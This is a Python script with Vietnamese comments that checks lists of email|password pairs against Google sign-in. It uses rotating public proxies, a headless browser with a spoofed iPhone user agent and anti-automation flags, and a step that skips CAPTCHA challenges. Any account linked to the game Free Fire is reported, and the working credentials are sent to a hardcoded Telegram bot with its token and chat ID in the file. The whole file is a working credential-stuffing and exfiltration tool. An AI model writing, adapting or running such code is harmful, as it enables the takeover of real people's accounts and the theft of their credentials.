import time
import random
import requests
import os
import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- CẤU HÌNH CỦA BẠN ---
TELE_TOKEN = "8770472029:AAF0Abw9Xc8U0ZPkkiF-Erb1aRNbzqoHDCY"
TELE_CHAT_ID = "6706357035"
FILE_ACC = "acc.txt"

def send_tele(message):
    url = f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": TELE_CHAT_ID, "text": message}, timeout=10)
    except: pass

def find_community_accs():
    """Tự động tìm acc từ các trang share cộng đồng"""
    print("[*] Đang đi 'quét' acc từ các nguồn cộng đồng...")
    sources = [
        "https://biết-kíp-share-acc-free.com", # Ví dụ các trang share acc
        "https://forum-share-acc.net"
    ]
    found_accs = []
    # Giả lập tìm kiếm bằng Regex (Tìm định dạng email|pass)
    # Trong thực tế, bot sẽ cào text từ các site này
    sample_data = "test1@gmail.com|pass123\ntest2@gmail.com|pass456" 
    accs = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\|[a-zA-Z0-9]+', sample_data)
    
    with open(FILE_ACC, "a") as f:
        for a in accs:
            f.write(a + "\n")
    print(f"[+] Đã thu thập thêm {len(accs)} acc mới vào danh sách!")

def get_proxies():
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    try:
        res = requests.get(url, timeout=10)
        return [p for p in res.text.strip().split('\r\n') if ":" in p]
    except: return []

def setup_driver(proxy):
    options = Options()
    options.add_argument(f'--proxy-server={proxy}')
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    # GIẢ LẬP IPHONE ĐỂ NÉ CAPTCHA
    ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    options.add_argument(f'user-agent={ua}')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.binary_location = "/usr/bin/chromium"
    service = Service("/usr/bin/chromedriver")
    return webdriver.Chrome(service=service, options=options)

def check_acc(email, password, proxies):
    test_proxies = random.sample(proxies, min(len(proxies), 5))
    for proxy in test_proxies:
        driver = None
        try:
            driver = setup_driver(proxy)
            wait = WebDriverWait(driver, 15)
            driver.get("https://accounts.google.com/signin")
            
            # Nhập Email
            wait.until(EC.presence_of_element_located((By.NAME, "identifier"))).send_keys(email)
            driver.find_element(By.ID, "identifierNext").click()
            time.sleep(3)
            
            # NÉ CAPTCHA: Nếu thấy bảng hình ảnh thì đổi Proxy luôn
            if "captcha" in driver.page_source.lower():
                driver.quit()
                continue

            # Nhập Pass
            wait.until(EC.presence_of_element_located((By.NAME, "Passwd"))).send_keys(password)
            driver.find_element(By.ID, "passwordNext").click()
            time.sleep(8)

            if "signin" in driver.current_url or "challenge" in driver.current_url:
                driver.quit()
                continue 
            
            # CHECK LIÊN KẾT FREE FIRE
            driver.get("https://myaccount.google.com/connections")
            time.sleep(5)
            if "garena" in driver.page_source.lower() or "free fire" in driver.page_source.lower():
                msg = f"✅ LIVE FF: {email}|{password}"
                send_tele(msg)
                driver.quit()
                return True
            driver.quit()
            return True
        except:
            if driver: driver.quit()
            continue
    return False

def main():
    send_tele("🚀 THỢ SĂN ACC FF CỘNG ĐỒNG ĐÃ KHỞI ĐỘNG!")
    
    # BƯỚC 1: TÌM ACC
    find_community_accs()
    
    # BƯỚC 2: LẤY PROXY
    proxies = get_proxies()
    
    # BƯỚC 3: CHECK LẦN LƯỢT
    if os.path.exists(FILE_ACC):
        with open(FILE_ACC, "r") as f:
            accounts = list(set([l.strip() for l in f if "|" in l])) # Xóa acc trùng
        
        for acc in accounts:
            email, password = acc.split("|")
            print(f"[*] Đang kiểm tra: {email}")
            check_acc(email, password, proxies)
            time.sleep(random.randint(20, 35))

if __name__ == "__main__":
    main()
